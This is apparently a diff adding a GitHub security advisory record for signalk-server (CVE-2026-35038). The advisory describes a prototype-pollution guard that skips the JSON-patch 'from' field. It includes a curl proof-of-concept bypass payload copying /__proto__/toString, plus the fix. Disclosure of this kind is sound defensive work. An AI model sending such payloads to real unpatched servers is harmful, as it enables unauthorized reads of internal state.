@@ -1,0 +1,56 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-04-03T04:04:23Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "signalk-server"
+  },
+  "Advisory": {
+    "DatabaseId": 346823,
+    "Id": "GSA_kwCzR0hTQS1xaDNqLW1yZzgtZjIzNM4ABUrH",
+    "GhsaId": "GHSA-qh3j-mrg8-f234",
+    "References": [
+      {
+        "Url": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-qh3j-mrg8-f234"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35038"
+      },
+      {
+        "Url": "https://github.com/SignalK/signalk-server/releases/tag/v2.24.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-qh3j-mrg8-f234"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-qh3j-mrg8-f234"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-35038"
+      }
+    ],
+    "Description": "## Summary \n\nThe /signalk/v1/applicationData/... JSON-patch endpoint allows users to modify stored application data. To prevent Prototype Pollution, the developers implemented an isPrototypePollutionPath guard. However, this guard only checks the path property of incoming JSON-patch objects. It completely fails to check the from property. Because JSON-patch operations like copy and move extract data using the from property path, an attacker can construct a payload where from targets /__proto__/someProperty, completely evading the security check and successfully executing an Arbitrary Prototype Read.\n\nWhile this does not allow arbitrary code execution (as the destination path remains protected from __proto__), it does allow a user to exfiltrate internal Node functions and prototype state into their own application data.\n\n## Vulnerability Root Cause \n\nFile: src/interfaces/applicationData.js (Lines 48-57)\n```\nconst DANGEROUS_PATH_SEGMENTS = ['__proto__', 'constructor', 'prototype']\n\nfunction isPrototypePollutionPath(pathString) {\n  const segments = pathString.split(/[./]/)\n  return segments.some((seg) =\u003e DANGEROUS_PATH_SEGMENTS.includes(seg))\n}\n\nfunction hasPrototypePollutionPatch(patches) {\n  return patches.some(\n    // [!VULNERABLE] Only checks patch.path, completely ignores patch.from\n    (patch) =\u003e patch.path \u0026\u0026 isPrototypePollutionPath(patch.path) \n  )\n}\n```\nAt Line 201:\n```\nif (hasPrototypePollutionPatch(req.body)) {\n  res.status(400).send('invalid patch path')\n  return\n}\njsonpatch.apply(applicationData, req.body) // jsonpatch natively resolves 'from'\n\n```\n## Proof of Concept (PoC)\n\nVerify the Developer Guard Works (The Blocked Payload):\n```\ncurl -X POST http://localhost:3000/signalk/v1/applicationData/global/testapp/1.0 \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '[{\"op\": \"add\", \"path\": \"/__proto__/polluted\", \"value\": \"hacked\"}]'\n```\nResult: 400 Bad Request - invalid patch path\n\nExecute the Bypass (The Malicious Payload):\n```\ncurl -X POST http://localhost:3000/signalk/v1/applicationData/global/testapp/1.0 \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '[{\"op\": \"copy\", \"from\": \"/__proto__/toString\", \"path\": \"/stolen\"}]'\n```\nResult: 200 OK - ApplicationData saved The security guard is bypassed and the json-patch engine successfully copies the __proto__ internal function reference.\n\n\u003cimg width=\"1222\" height=\"230\" alt=\"Screenshot 2026-03-24 150440\" src=\"https://github.com/user-attachments/assets/5ae580fd-284f-4bef-adc8-31b50b8751b6\" /\u003e\n\n## Security Impact\nThis vulnerability allows a low-privileged authenticated user to bypass prototype boundary filtering to extract internal functions and properties from the global prototype object this violates data isolation and lets a user read more than they should.\n\n## Fixing Arbitrary Prototype Read\n\nThe hasPrototypePollutionPatch function must be updated to inspect ALL path-related fields:\n```\nfunction hasPrototypePollutionPatch(patches) {\n  return patches.some(\n    (patch) =\u003e \n      (patch.path \u0026\u0026 isPrototypePollutionPath(patch.path)) ||\n      (patch.from \u0026\u0026 isPrototypePollutionPath(patch.from))\n  )\n}\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-03T04:04:22Z",
+    "Severity": "LOW",
+    "Summary": "Signal K Server: Arbitrary Prototype Read via `from` Field Bypass",
+    "UpdatedAt": "2026-04-03T04:04:23Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.24.0"
+      },
+      "VulnerableVersionRange": "\u003c 2.24.0"
+    }
+  ]
+}
